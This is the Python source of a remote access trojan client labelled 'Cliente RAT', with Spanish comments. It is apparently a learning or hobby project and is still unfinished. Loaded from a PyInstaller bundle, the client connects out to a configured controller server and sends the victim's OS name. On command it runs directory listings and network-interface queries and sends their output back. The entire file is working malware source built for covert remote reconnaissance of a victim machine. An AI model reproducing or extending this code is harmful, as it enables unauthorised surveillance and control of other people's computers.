# Cliente RAT

'''
	NOTA:
		Para el cliente es necesario establecer mas comandos a recibir.
'''

import socket
import subprocess as sp
import os
import sys
import configparser


class Cliente():
	# Constructor...
	def __init__(self):
		# Fichero de configuracion para el socket
		self._config = configparser.ConfigParser()
		self._config.read(os.path.join(sys._MEIPASS, '.', 'conf', 'socket.ini')) # Directorio temporal de config
		
		# Datos para conexion a servidor
		self._CON_HOST = self._config['SOCKET']['host_ip'] # '127.0.0.1'
		self._CON_PUERTO = int(self._config['SOCKET']['puerto']) # 5322
		self._IPV4_CON = socket.AF_INET
		self._TCP_CON = socket.SOCK_STREAM
		self._CODIF = 'utf-8'
		self._os_host = os.name # Escaneo de sistema victima


	# Metodos...
	# Conexion con serv
	def conectar_cliente(self):
		print(f" [+] Iniciando cliente...\n")

		try:
			# Configuracion y conexion a servidor
			with socket.socket(self._IPV4_CON, self._TCP_CON) as s_cli:
				print(f" [+] Estableciendo conexión...\n")
				s_cli.settimeout(60) # Espera a transferencia de datos con servidor por 1 mint
				s_cli.connect((self._CON_HOST, self._CON_PUERTO))
				print(f" [+] Conexión establecida!\n")

				# Envio de información de OS
				s_cli.send(str(self._os_host).encode(self._CODIF))

				# Bucle principal (recibir, procesar, enviar)
				while True:
					# Recepcion de datos del servidor
					data = s_cli.recv(1024)

					if data:
						# Salir
						if data.decode(self._CODIF) == "\0": # Revisar este apartado, funciona pero no entiendo por qué xd
							break
						# Enviar OS
						elif data.decode(self._CODIF) == 'os':
							s_cli.send(str(self._os_host).encode(self._CODIF))
						
						# Enviar inf dir actual
						elif data.decode(self._CODIF) == 'dir':
							dir_retorno = sp.run(['ls', '-l'], capture_output=True, text=True)
							s_cli.send(dir_retorno.stdout.encode(self._CODIF))
						
						# Enviar inf ip interfaces de red
						elif data.decode(self._CODIF) == 'ip':
							ip_inf = sp.run(['ip', 'addr', 'show'], capture_output=True, text=True)
							s_cli.send(ip_inf.stdout.encode(self._CODIF))
						
						# Nada
						else:
							continue
					# Sin datos o datos de finalizacion de conexión
					else:
						break

			print(f" [+] Conexión finalizada.\n")

		except socket.timeout:
			print(f"\n [+] Tiempo de espera exedido!\n")
			# socket.close() # No es necesario

		except KeyboardInterrupt:
			print(f"\n [+] Conexión interrumpida o fallida :'( \n")

		except:
			print(f"\n [+] Servidor no encontrado :'( \n")


# Ejecucion principal
if __name__ == '__main__':
	cliente = Cliente()
	cliente.conectar_cliente()
